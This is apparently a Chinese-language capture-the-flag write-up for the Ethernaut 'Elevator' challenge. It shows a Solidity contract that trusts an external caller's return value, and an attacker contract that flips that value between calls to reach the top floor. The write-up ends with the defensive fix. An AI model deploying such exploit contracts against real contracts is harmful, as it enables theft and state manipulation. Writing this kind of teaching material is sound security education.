# Elevator

> 电梯不会让你达到大楼顶部, 对吧?

## 源码

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

interface Building {
  function isLastFloor(uint) external returns (bool);
}


contract Elevator {
  bool public top;
  uint public floor;

  function goTo(uint _floor) public {
    Building building = Building(msg.sender);

    if (! building.isLastFloor(_floor)) {
      floor = _floor;
      top = building.isLastFloor(floor);
    }
  }
}
```

攻击思路

只要两次连续调用返回的bool值不同即可

攻击代码

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Elevator {
    function goTo(uint _floor) external;
}

contract Building {

    Elevator constant private target = Elevator(0xB1092Eed9f891efF6C136f54eee0b33FBB0a7E72);

    bool flag = false;

    function attack() public{
        target.goTo(100);
    }
    
    function isLastFloor(uint floor) external returns (bool){
       bool _flag = flag;
       flag = !flag;
       return _flag;
   }
}
```

你可以在接口使用 `view` 函数修改器来防止状态被篡改. `pure` 修改器也可以防止状态被篡改. 认真阅读 [Solidity's documentation](http://solidity.readthedocs.io/en/develop/contracts.html#view-functions) 并学习注意事项.

完成这一关的另一个方法是构建一个 view 函数, 这个函数根据不同的输入数据返回不同的结果, 但是不更改状态, 比如 `gasleft()`.